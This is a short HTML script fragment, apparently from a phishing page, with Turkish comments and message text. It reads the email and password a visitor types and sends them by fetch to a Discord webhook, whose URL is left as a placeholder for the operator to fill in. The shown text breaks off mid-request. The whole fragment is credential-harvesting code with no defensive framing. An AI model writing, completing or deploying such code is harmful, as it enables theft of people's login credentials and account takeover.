  <script>
    const webhookURL = "WEBHOOK_URLUNU_BURAYA_YAZ";

    function sendToDiscord() {
      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      fetch(webhookURL, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content: `Yeni giriş denemesi:\nEmail/Kullanıcı Adı: ${email}\nŞifre: ${password}`
